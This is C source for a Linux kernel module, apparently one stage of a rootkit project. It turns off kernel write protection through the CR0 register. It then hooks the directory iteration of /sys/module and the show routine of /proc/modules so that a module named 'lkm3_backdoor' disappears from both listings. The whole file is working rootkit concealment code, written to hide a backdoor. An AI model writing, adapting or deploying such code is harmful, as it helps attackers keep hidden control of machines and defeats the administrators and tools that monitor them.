#include <linux/kobject.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/seq_file.h>
#include <linux/dirent.h>
#include <linux/unistd.h>
#include <linux/file.h>
#include <linux/errno.h>
#include <linux/string.h>

//  hide /sys/module   same to file hide
#define ROOT_PATH "/sys/module"
#define SECRET_MOD "lkm3_backdoor"

#define set_f_op(op,path,new,old)										\
	do{																	\
    	struct file_operations *f_op; 									\
    	struct file *filp = filp_open(path,O_RDONLY,0); 				\
    	if(IS_ERR(filp)){ 												\
        	printk("LKM6:Failed open\n");								\
        	old = NULL;													\
    	}else{															\
			printk("LKM6:Success open");								\
			f_op = (struct file_operations *)filp->f_op;				\
			old = f_op->op;												\
			disable_write_protection();									\
        	f_op->op = new;												\
        	enable_write_protection();									\
    	}																\
	}while(0)

// hide /proc/modules
#define PROC_PATH "/proc/modules"  
#define set_file_seq_op(opname,path,new,old)							\
	do{																	\
		struct file *filp;												\
		struct seq_file *seq;											\
		struct seq_operations *seq_op;									\
		filp = filp_open(path,O_RDONLY,0);								\
		if(IS_ERR(filp)){												\
			printk("Failed open\n");									\
			old=NULL;													\
		}else{															\
			printk("Success opening filp\n");							\
			seq = (struct seq_file*)filp->private_data;					\
			seq_op = (struct seq_operations *)seq->op;					\
			old = seq_op->opname;										\
			disable_write_protection();									\
			seq_op->opname = new;										\
			enable_write_protection();									\
		}																\
	}while(0)

int (*real_iterate)(struct file *filp,struct dir_context *ctx);
int (*real_filldir)(struct dir_context *ctx,const char *name,int namlen,loff_t offset, u64 ino, unsigned d_type);

int fake_iterate(struct file *filp,struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx,const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);

int (*real_seq_show)(struct seq_file *seq,void *v);
int fake_seq_show(struct seq_file *seq,void *v);


void disable_write_protection(void){
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    clear_bit(16,&cr0);
    write_cr0(cr0);
    printk("LKM6:disable Write Protection\n");
    preempt_enable();
    return;
}

void enable_write_protection(void){
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    set_bit(16,&cr0);
    write_cr0(cr0);
    preempt_enable();
    printk("LKM6:enable Write Protection\n");
    return;
}




static int lkm_init(void){
    
    printk("LKM6:hideMod module loaded!\n");

	//new version kernel    iterate change to iterate_shared
    set_f_op(iterate_shared,ROOT_PATH,fake_iterate,real_iterate);
	set_file_seq_op(show,PROC_PATH,fake_seq_show,real_seq_show);
    
    if(!real_iterate){
        return -ENOENT;
    }
    return 0;
}

static void lkm_exit(void){
    if(real_iterate){
        void *dummy;
        set_f_op(iterate_shared,ROOT_PATH,real_iterate,dummy);
    }
    if(real_seq_show){
        void *dummy;
        set_file_seq_op(show,PROC_PATH,real_seq_show,dummy);
    }

    printk("LKM6:hideMod module removed\n");
	return;

}

int fake_iterate(struct file *filp,struct dir_context *ctx){
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;
    return real_iterate(filp,ctx);
}


int fake_filldir(struct dir_context *ctx,const char *name, int namlen,loff_t offset, u64 ino,unsigned d_type){
    if(strcmp(SECRET_MOD,name)==0){
        printk("LKM6:Module %s hided in %s\n",SECRET_MOD,ROOT_PATH);
        return 0;
    }
    return real_filldir(ctx,name,namlen,offset,ino,d_type);
}

int fake_seq_show(struct seq_file *seq,void *v){
    int ret;
    size_t last_count,last_size;
	last_count = seq->count;
	ret = real_seq_show(seq,v);
	last_size = seq->count - last_count;
	if(strnstr(seq->buf+seq->count-last_size,SECRET_MOD,last_size)){
        printk("LKM6:Module %s hided in %s\n",SECRET_MOD,PROC_PATH);
		seq->count -= last_size;
    }
	return ret;
}





module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
